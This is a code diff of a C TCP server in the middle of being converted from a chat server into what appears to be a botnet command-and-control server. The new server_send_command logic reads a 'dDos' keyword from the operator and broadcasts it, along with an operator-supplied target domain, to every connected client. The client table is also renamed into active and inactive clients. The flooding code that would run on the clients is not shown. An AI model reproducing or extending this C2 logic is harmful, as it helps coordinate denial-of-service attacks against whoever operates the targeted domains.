@@ -13,7 +13,7 @@
 #define MAX_CLIENTS     100
  
 static unsigned int cli_count = 0;
-static int uid = 10;
+static int uid = 0;
 pthread_mutex_t lock;
 
 /* Client structure */
@@ -173,21 +173,25 @@ void print_table(){
     printf("\n***************************\n");
     printf("**    Active Clients:    **\n");
     printf("***************************\n");
-    printf("ID        IP          Last Connect Time\n");
-    printf("--------------------------------------------------------------------------------------------------------\n");
+    printf("ID               Last Connect Time\n");
+    printf("-----------------------------------------\n");
     
     
     for(i=0;i<MAX_CLIENTS;i++){
         if(clients[i]){
             printf("%d            ",clients[i]->uid);
             printf("%s",clients[i]->client_time);
-            printf("\n");
+            printf("\n\n");
         }
     }
-
+    printf("\n***************************\n");
+    printf("**    Inactive Clients:  **\n");
+    printf("***************************\n");
+    printf("ID                    Last Connect Time\n");
+    printf("-----------------------------------------\n");
     for(i=0;i<MAX_CLIENTS;i++){
         if(dead_clients[i]){
-            printf("%d        %s    \n",dead_clients[i]->uid/*client_time[j],*/);
+            printf("%d            \n",dead_clients[i]->uid/*client_time[j],*/);
         }
     }
    
@@ -199,6 +203,8 @@ void print_table(){
 void *server_send_command(void *arg){
     char buff_in[1024];
     char buff_out[1024];
+    char target_domain[100];
+
     int slen;
     while(1){
         scanf("%s", buff_in);
@@ -206,8 +212,16 @@ void *server_send_command(void *arg){
         buff_in[slen] = '\0';
         if(buff_in[0] != '\0'){
             pthread_mutex_lock(&lock);
-            sprintf(buff_out, "[Server] %s\r\n", buff_in);
-            send_message_all(buff_out);
+            if(!strcmp(buff_in,"dDos")){
+                send_message_all("dDos");
+                scanf("%s", target_domain);
+                send_message_all(target_domain);
+                memset(target_domain, 0, 100);
+            }
+            else{
+                sprintf(buff_out, "[Server] %s\r\n", buff_in);
+                send_message_all(buff_out);
+            }
             buff_in[0] = '\0';
             buff_out[0] = '\0';
             pthread_mutex_unlock(&lock);
@@ -255,7 +269,7 @@ void *hanle_client(void *arg){
         }
 
         /* Special options */
-        /*if(buff_in[0] == '\\'){
+ /*       if(buff_in[0] == '\\'){
             char *command, *param;
             command = strtok(buff_in," ");
             if(!strcmp(command, "\\QUIT")){
@@ -313,8 +327,9 @@ void *hanle_client(void *arg){
             sprintf(buff_out, "[%s] %s\r\n", cli->name, buff_in);
             send_message(buff_out, cli->uid);
 
-            pthread_mutex_unlock(&lock);
+            
         }
+        pthread_mutex_unlock(&lock);
     }
  
     /* Close connection */
@@ -438,5 +453,5 @@ int main(int argc, char *argv[]){
  
         /* Reduce CPU usage */
         sleep(1);
-     }
+    }
 }
